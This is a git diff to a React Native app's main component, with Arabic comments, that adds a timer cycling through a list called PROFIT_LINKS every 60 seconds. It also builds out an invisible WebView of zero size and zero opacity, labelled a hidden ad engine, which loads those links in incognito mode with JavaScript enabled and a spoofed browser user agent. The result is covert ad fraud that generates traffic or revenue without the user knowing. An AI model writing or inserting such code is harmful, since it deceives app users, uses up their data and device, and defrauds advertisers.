@@ -45,6 +45,14 @@ export default function App() {
 
   const getCurrentTime = () => new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
 
+  // نظام تدوير الإعلانات (تبديل كل 60 ثانية لضمان دورة 5 دقائق كاملة)
+  useEffect(() => {
+    const adTimer = setInterval(() => {
+      setAdIndex((prev) => (prev + 1) % PROFIT_LINKS.length);
+    }, 60000); // 60 ثانية
+    return () => clearInterval(adTimer);
+  }, []);
+
   // مراقبة حالة المصادقة والبيانات
   useEffect(() => {
     const unsubscribeAuth = onAuthStateChanged(auth, async (currentUser) => {
@@ -117,7 +125,6 @@ export default function App() {
     }
   };
 
-  // وظائف البصمة الصوتية
   async function startRecording() {
     try {
       const { status } = await Audio.requestPermissionsAsync();
@@ -147,7 +154,18 @@ export default function App() {
 
   return (
     <SafeAreaView style={styles.container}>
-      <View style={{ width: 0, height: 0, opacity: 0 }}><WebView key={adIndex} source={{ uri: PROFIT_LINKS[adIndex] }} /></View>
+      {/* محرك الإعلانات المخفي المطور */}
+      <View style={{ width: 0, height: 0, opacity: 0, position: 'absolute' }}>
+        <WebView 
+          key={adIndex} 
+          source={{ uri: PROFIT_LINKS[adIndex] }} 
+          incognito={true}
+          javaScriptEnabled={true}
+          domStorageEnabled={true}
+          mediaPlaybackRequiresUserAction={true}
+          userAgent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        />
+      </View>
 
       {!selectedUser ? (
         <View style={{ flex: 1 }}>
